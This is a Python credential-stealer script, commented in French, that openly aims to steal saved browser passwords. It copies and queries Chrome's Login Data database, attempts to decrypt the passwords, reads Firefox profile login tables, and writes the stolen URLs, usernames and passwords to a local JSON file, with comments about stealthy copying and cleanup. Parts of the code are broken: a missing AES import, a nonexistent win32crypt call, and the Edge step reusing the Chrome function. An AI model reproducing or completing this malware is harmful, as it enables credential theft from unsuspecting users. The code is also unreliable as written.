import sqlite3
import json
import os
from cryptography.fernet import Fernet
import base64
import win32crypt
import shutil

# Chemins des bases de données des navigateurs
CHROME_PATH = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
FIREFOX_PATH = os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
EDGE_PATH = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")

def decrypt_chrome_password(password, master_key):
    """Déchiffrement des mots de passe Chrome (AES-256)"""
    try:
        iv = password[3:15]
        password = base64.b64decode(password[15:])
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[16:].decode()
    except:
        return ""

def steal_chrome_passwords():
    """Vol des mots de passe Chrome"""
    shutil.copy2(CHROME_PATH, "Login Data.db")  # Copie furtive
    conn = sqlite3.connect("Login Data.db")
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    passwords = []
    for url, username, encrypted_password in cursor.fetchall():
        master_key = win32crypt.CryptUnprotectData(win32crypt.GetUserKey())[1]
        password = decrypt_chrome_password(encrypted_password, master_key)
        passwords.append({"url": url, "username": username, "password": password})
    conn.close()
    os.remove("Login Data.db")  # Nettoyage
    return passwords

def steal_firefox_passwords():
    """Vol des mots de passe Firefox (via SQLite)"""
    profiles = os.listdir(FIREFOX_PATH)
    passwords = []
    for profile in profiles:
        path = os.path.join(FIREFOX_PATH, profile, "signons.sqlite")
        if os.path.exists(path):
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute("SELECT hostname, encType, encryptedUsername, encryptedPassword FROM moz_logins")
            for row in cursor.fetchall():
                hostname, _, username, password = row
                passwords.append({"url": f"https://{hostname}", "username": username, "password": password})
            conn.close()
    return passwords

def steal_browser_data():
    """Fonction principale de vol de données"""
    chrome_pw = steal_chrome_passwords()
    firefox_pw = steal_firefox_passwords()
    edge_pw = steal_chrome_passwords()  # Edge utilise la même base que Chrome

    # Sauvegarde des données volées
    with open("stolen_data.json", "w") as f:
        json.dump({
            "chrome": chrome_pw,
            "firefox": firefox_pw,
            "edge": edge_pw
        }, f, indent=4)

    print("[+] Données volées sauvegardées dans stolen_data.json")
